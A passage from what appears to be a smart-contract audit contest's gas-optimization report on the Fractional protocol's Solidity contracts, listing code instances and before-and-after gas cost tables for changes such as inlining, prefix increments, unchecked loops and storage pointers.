function _computePermitStructHash( 325:         address _owner, 326:         address _operator, 327:         uint256 _id, 328:         bool _approved, 329:         uint256 _deadline 330:     ) internal returns (bytes32)  ```  ```cpp 350:     function _computePermitAllStructHash( 351:         address _owner, 352:         address _operator, 353:         bool _approved, 354:         uint256 _deadline 355:     ) internal returns (bytes32)  ```  ### src/Vault.sol  ```cpp 142:     function _revertedWithReason(bytes memory _response) internal pure  ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Inline these functions where they are called:  - gas costs before inlining:  ╭───────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ FERC1155 contract ┆                 ┆       ┆        ┆       ┆         │ ╞═══════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost   ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 1863562           ┆ 9340            ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name     ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ permit            ┆ 898             ┆ 26460 ┆ 25659  ┆ 49995 ┆ 12      │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ permitAll         ┆ 853             ┆ 27880 ┆ 25585  ┆ 49588 ┆ 13      │ ╰───────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯ ╭────────────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ Vault contract         ┆                 ┆       ┆        ┆       ┆         │ ╞════════════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 816851                 ┆ 4112            ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ execute                ┆ 3585            ┆ 40629 ┆ 61371  ┆ 66336 ┆ 182     │ ╰────────────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯  - gas costs after inlining:  ╭───────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ FERC1155 contract ┆                 ┆       ┆        ┆       ┆         │ ╞═══════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost   ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 1833333           ┆ 9189            ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name     ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ permit            ┆ 898             ┆ 26348 ┆ 25519  ┆ 49855 ┆ 12      │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ permitAll         ┆ 853             ┆ 27768 ┆ 25447  ┆ 49450 ┆ 13      │ ╰───────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯ ╭────────────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ Vault contract         ┆                 ┆       ┆        ┆       ┆         │ ╞════════════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 815051                 ┆ 4103            ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ execute                ┆ 3585            ┆ 40628 ┆ 61371  ┆ 66336 ┆ 182     │ ╰────────────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯  In `FERC1155.sol`:  - `30,229` gas is saved upon deployment - `112` gas is saved per `permit` call on average  - `112` gas is saved per `permitAll` call on average   In `Vault.sol`:  - `1,800` gas is saved upon deployment    # Mathematical optimizations  ## PROBLEM  X += Y costs `22` more gas than X = X + Y. This can mean a lot of gas wasted in a function call when the computation is repeated `n` times (loops)  ## PROOF OF CONCEPT  15 instances include:  ### src/FERC1155.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L62 ```cpp 62:        totalSupply[_id] -= _amount; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L86 ```cpp 86:        totalSupply[_id] += _amount; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L270-L271 ```cpp 270:         balanceOf[_from][_id] -= _amount; 271:         balanceOf[_to][_id] += _amount; ```  ### src/modules/Buyout.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L139 ```cpp 139:         buyoutInfo[_vault].ethBalance -= ethAmount ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L176 ```cpp 176:         buyoutInfo[_vault].ethBalance += msg.value ```  ### src/modules/Migration.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L123 ```cpp 123:         proposal.totalEth += msg.value; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L124 ```cpp 124:         userProposalEth[_proposalId][msg.sender] += msg.value; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L134 ```cpp 134:         proposal.totalFractions += _amount; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L135 ```cpp 135:         userProposalFractions[_proposalId][msg.sender] += _amount; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L156 ```cpp 156:         proposal.totalFractions -= _amount; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L160 ```cpp 160:         proposal.totalEth -= ethAmount; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L497 ```cpp 497:                 treeLength += IModule(_modules[i]).getLeafNodes().length; ```  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L147 ```cpp 147:             for (uint256 i; i < length - 1; i += 2)  ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L190 ```cpp 190:             ceil -= pOf2; ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  use `X = X + Y` instead of `X += Y` (same with `-`)  # Modifier instead of duplicate require  ## PROBLEM  When a `require` statement is used multiple times, it is cheaper in deployment costs to use a modifier instead.  ## PROOF OF CONCEPT  2 instances where a modifier can be used:  ### src/Vault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L76 ```cpp 76:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L87 ```cpp 87:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L94 ```cpp 94:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L102 ```cpp 102:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62 ```cpp 62:         require(_data.length > 1, "wont generate root for single leaf"); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78 ```cpp 78:         require(_data.length > 1, "wont generate root for single leaf"); ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  Use modifiers for these repeated statements   # Prefix increments  ## IMPACT  Prefix increments are cheaper than postfix increments - `6` gas. This can mean interesting savings in `for` loops.  ## PROOF OF CONCEPT  2 instances:  ### src/Vault.sol  ```cpp 78:         for (uint256 i = 0; i < length; i++) ```  ```cpp 104:         for (uint256 i = 0; i < length; i++) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  change `i++` to `++i`.  # Revert strings length  ## IMPACT  Revert strings cost more gas to deploy if the string is larger than 32 bytes. It costs an extra `9,500` gas per string exceeding that 32-byte size upon deployment.  ## PROOF OF CONCEPT  Revert strings exceeding 32 bytes include instances:  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62 ```cpp 62:         require(_data.length > 1, "wont generate root for single leaf"); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78 ```cpp 78:         require(_data.length > 1, "wont generate root for single leaf"); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Write the error strings so that they do not exceed 32 bytes. For further gas savings, consider also using [custom errors](#custom-errors).   # Shifting cheaper than division  ## IMPACT  A division by 2 can be calculated by shifting one to the right. While the `DIV` opcode uses `5` gas, the `SHR` opcode only uses `3` gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  ## PROOF OF CONCEPT  3 instances:  ### src/utils/MerkleBase.sol  ```cpp 100:                 _node = _node / 2 ```  ```cpp 136:                 result = new bytes32[](length / 2 + 1); ```  ```cpp 142:                 result = new bytes32[](length / 2) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace `/ 2` with `>>1`   # Storage cheaper than memory  ## PROBLEM  Reference types cached in memory cost more gas than using storage, as new memory is allocated for these variables, copying data from storage to memory.  ## PROOF OF CONCEPT  Instances:  ### src/VaultRegistry.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L40 ```cpp 40:         VaultInfo memory info = vaultToToken[msg.sender]; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L118 ```cpp 118:         VaultInfo memory info = vaultToToken[msg.sender]; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L128 ```cpp 128:         VaultInfo memory info = vaultToToken[_vault]; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L136 ```cpp 136:         VaultInfo memory info = vaultToToken[_vault]; ```  - original gas costs with these `VaultInfo memory info`  ╭────────────────────────┬─────────────────┬────────┬────────┬────────┬─────────╮ │ VaultRegistry contract ┆                 ┆        ┆        ┆        ┆         │ ╞════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 3898606                ┆ 19409           ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ burn                   ┆ 2349            ┆ 4218   ┆ 4255   ┆ 4255   ┆ 52      │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ mint                   ┆ 51597           ┆ 54389  ┆ 54845  ┆ 54845  ┆ 107     │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ totalSupply            ┆ 1878            ┆ 1878   ┆ 1878   ┆ 1878   ┆ 203     |   ╰────────────────────────┴─────────────────┴────────┴────────┴────────┴─────────╯  - new gas costs with these four instances as `VaultInfo storage info`  ╭────────────────────────┬─────────────────┬────────┬────────┬────────┬─────────╮ │ VaultRegistry contract ┆                 ┆        ┆        ┆        ┆         │ ╞════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 3881997                ┆ 19326           ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ burn                   ┆ 2268            ┆ 4153   ┆ 4190   ┆ 4190   ┆ 52      │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ mint                   ┆ 51516           ┆ 54308  ┆ 54764  ┆ 54764  ┆ 107     │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ totalSupply            ┆ 1833            ┆ 1833   ┆ 1833   ┆ 1833   ┆ 203     |   ╰────────────────────────┴─────────────────┴────────┴────────┴────────┴─────────╯  - `16,609` gas is saved upon deployment - `80` gas is saved per `mint` call on average  - `65` gas is saved per `burn` call on average  - `45` gas is saved per `totalSupply` call.   ## TOOLS USED  Manual Analysis  ## MITIGATION  Use `storage` instead of `memory`  # Storage pointer for structs  ## PROBLEM  Using a `storage` pointer is cheaper than reading a struct field several times.  ## PROOF OF CONCEPT  Instances:  ### src/modules/Buyout.sol  ```cpp 297:         (buyoutInfo[_vault].state, buyoutInfo[_vault].proposer) = ( 298:             State.SUCCESS, 299:             msg.sender 300:         ); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Use a `storage` pointer   ```diff +        Auction storage _vaultInfo = buyoutInfo[_vault]; +       (_vaultInfo.state, _vaultInfo.proposer) = ( -297:         (buyoutInfo[_vault].state, buyoutInfo[_vault].proposer) = ( 298:             State.SUCCESS, 299:             msg.sender 300:         ); ```   - original gas costs   ╭──────────────────────┬─────────────────┬────────┬────────┬────────┬─────────╮ │ Buyout contract      ┆                 ┆        ┆        ┆        ┆         │ ╞══════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡ │ Deployment Cost      ┆ Deployment Size ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 2779003              ┆ 13880           ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name        ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ redeem               ┆ 4184            ┆ 30536  ┆ 41198  ┆ 41198  ┆ 8       │ ╰──────────────────────┴─────────────────┴────────┴────────┴────────┴─────────╯  - new gas costs   ╭──────────────────────┬─────────────────┬────────┬────────┬────────┬─────────╮ │ Buyout contract      ┆                 ┆        ┆        ┆        ┆         │ ╞══════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡ │ Deployment Cost      ┆ Deployment Size ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 2775995              ┆ 13865           ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name        ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ redeem               ┆ 4184            ┆ 30532  ┆ 41193  ┆ 41193  ┆ 8       │ ╰──────────────────────┴─────────────────┴────────┴────────┴────────┴─────────╯  - `3,008` gas is saved upon deployment - `5` gas is saved per `redeem` call on average    # Transfers should be avoided if amount null  ## IMPACT  Gas can be saved by avoid `ERC20.transfer` function calls when the `amount` to be transferred is `0`  ## PROOF OF CONCEPT  Instances include:  ### src/modules/Buyout.sol  ```cpp 129:         IERC1155(token).safeTransferFrom( 130:             msg.sender, 131:             address(this), 132:             id, 133:             _amount, 134:             "" 135:         ); ``` There is no check that `_amount` is not zero ( it is a function argument)  ```cpp 141:         _sendEthOrWeth(msg.sender, ethAmount); ``` In the case `_amount` was zero, `ethAmount` would be zero too  ## TOOLS USED  Manual Analysis  ## MITIGATION  Add checks to ensure the `_amount` is not `0`  # Unchecked arithmetic  ## IMPACT  The default "checked" behavior costs more gas when adding/diving/multiplying, because under-the-hood those checks are implemented as a series of opcodes that, prior to performing the actual arithmetic, check for under/overflow and revert if it is detected.  if it can statically be determined there is no possible way for your arithmetic to under/overflow (such as a condition in an if statement), surrounding the arithmetic in an `unchecked` block will save gas  ## PROOF OF CONCEPT  Instances:   ### src/Vault.sol  `i` is cannot overflow as it is a `for` loop  ```cpp 78:         for (uint256 i = 0; i < length; i++) ```  `i` is cannot overflow as it is a `for` loop  ```cpp 104:         for (uint256 i = 0; i < length; i++) ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  Place the arithmetic operations in an `unchecked` block   # Unnecessary computation  ## IMPACT  Redundant external calls waste gas.  ## PROOF OF CONCEPT  Instances:  ### src/modules/Migration.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L438 - `buyoutInfo` is called twice:  ```cpp 438:         (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(_vault) 447:         (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(_vault); ```    ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace  ```diff -438:         (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo( -439:             _vault -440:         ); +438:         (, address proposer, State current, , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo( +439:             _vault +440:         ); 441:         State required = State.SUCCESS; 442:         if (current != required) revert IBuyout.InvalidState(required, current); 443:         // Reverts if proposer of buyout is not this contract 444:         if (proposer != address(this)) revert NotProposalBuyout(); 445:  446:         // Gets the last total supply of fractions for the vault -447:         (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo( -448:             _vault -449:         );  ```  - gas costs before amendment  ╭──────────────────────────┬─────────────────┬────────┬────────┬────────┬─────────╮ │ Migration contract       ┆                 ┆        ┆        ┆        ┆         │ ╞══════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡ │ Deployment Cost          ┆ Deployment Size ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 3202385                  ┆ 15886           ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name            ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ migrateFractions         ┆ 4079            ┆ 15056  ┆ 5786   ┆ 39226  ┆ 6       │ ╰──────────────────────────┴─────────────────┴────────┴────────┴────────┴─────────╯  - gas costs after amendment  ╭──────────────────────────┬─────────────────┬────────┬────────┬────────┬─────────╮ │ Migration contract       ┆                 ┆        ┆        ┆        ┆         │ ╞══════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡ │ Deployment Cost          ┆ Deployment Size ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 3166145                  ┆ 15705           ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name            ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ migrateFractions         ┆ 4094            ┆ 14384  ┆ 5786   ┆ 36970  ┆ 6       │ ╰──────────────────────────┴─────────────────┴────────┴────────┴────────┴─────────╯  - `36,240` gas is saved upon deployment - `672` gas is saved per `migrateFractions` call on average 
